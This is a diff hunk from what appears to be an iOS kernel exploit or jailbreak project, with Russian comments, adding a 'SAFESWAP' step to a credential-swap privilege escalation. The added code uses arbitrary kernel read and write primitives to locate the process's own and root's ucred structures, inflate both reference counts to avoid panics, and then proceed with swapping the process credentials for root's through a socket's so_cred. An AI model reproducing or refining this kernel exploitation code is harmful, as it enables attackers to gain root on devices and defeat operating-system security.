@@ -8249,9 +8249,37 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     if (rootZVA && ucF) {
                         extern uint64_t rwSocketPcb;   // kutils.m / kexploit
                         kpNote(r, @"  [SELFSWAP] поиск so_cred/fg_cred на наших объектах");
+                        // 2.0.33 [SAFESWAP] — refcount-танец. Паники 13:10/13:28:
+                        // zfree на живых cred: свап без crhold обнуляет счётчик.
+                        // Счётчик = ucred_rw+0, а ucred_rw — тип 0x21, ПИШЕТСЯ.
+                        // Сначала надуваем оба счётчика, потом свап.
+                        uint64_t myRW = kp_untag_ptr(early_kread64(ucF + 0x00));
+                        uint64_t rootRW = kpLooksLikeKernelPointer(rootZVA) ? kp_untag_ptr(early_kread64(rootZVA + 0x00)) : 0;
+                        uint64_t myRWpa = kpLooksLikeKernelPointer(myRW) ? kvtophys(myRW & ~0x3fffULL) : 0;
+                        uint64_t rootRWpa = kpLooksLikeKernelPointer(rootRW) ? kvtophys(rootRW & ~0x3fffULL) : 0;
+                        kpNote(r, [NSString stringWithFormat:@"  [SAFESWAP] myRW=%#llx (pa=%#llx тип=%d) rootRW=%#llx (pa=%#llx тип=%d)",
+                                  (unsigned long long)myRW, (unsigned long long)myRWpa, myRWpa ? kpFrameTypeOf(myRWpa) : -1,
+                                  (unsigned long long)rootRW, (unsigned long long)rootRWpa, rootRWpa ? kpFrameTypeOf(rootRWpa) : -1]);
+                        BOOL refsOK = NO;
+                        if (myRWpa && rootRWpa && kpFrameTypeOf(myRWpa) == 0x21 && kpFrameTypeOf(rootRWpa) == 0x21) {
+                            uint64_t myRWk = phystokv(myRWpa), rootRWk = phystokv(rootRWpa);
+                            uint64_t myRef = early_kread64(myRWk + (myRW & 0x3fff));
+                            uint64_t rootRef = early_kread64(rootRWk + (rootRW & 0x3fff));
+                            early_kwrite64(myRWk + (myRW & 0x3fff), myRef + 0x10000);
+                            early_kwrite64(rootRWk + (rootRW & 0x3fff), rootRef + 0x10000);
+                            uint64_t myRef2 = early_kread64(myRWk + (myRW & 0x3fff));
+                            uint64_t rootRef2 = early_kread64(rootRWk + (rootRW & 0x3fff));
+                            refsOK = (myRef2 == myRef + 0x10000) && (rootRef2 == rootRef + 0x10000);
+                            kpNote(r, [NSString stringWithFormat:@"  [SAFESWAP] refcount: my %#llx→%#llx root %#llx→%#llx — %@",
+                                      (unsigned long long)myRef, (unsigned long long)myRef2,
+                                      (unsigned long long)rootRef, (unsigned long long)rootRef2,
+                                      refsOK ? @"надуты ★" : @"не надулись (свап отменён)"]);
+                        } else {
+                            kpNote(r, @"  [SAFESWAP] ucred_rw не тип 0x21 — refcount-танец недоступен, свап отменён (безопасность)");
+                        }
                         uint64_t sockVA = 0;
                         if (rwSocketPcb) sockVA = kp_untag_ptr(early_kread64(rwSocketPcb + off_inpcb_inp_socket));
-                        if (kpLooksLikeKernelPointer(sockVA)) {
+                        if (refsOK && kpLooksLikeKernelPointer(sockVA)) {
                             uint32_t socOff = 0xFFFFFFFF;
                             for (uint32_t o = 0; o + 8 <= 0x300; o += 8)
                                 if (early_kread64(sockVA + o) == ucF) { socOff = o; break; }
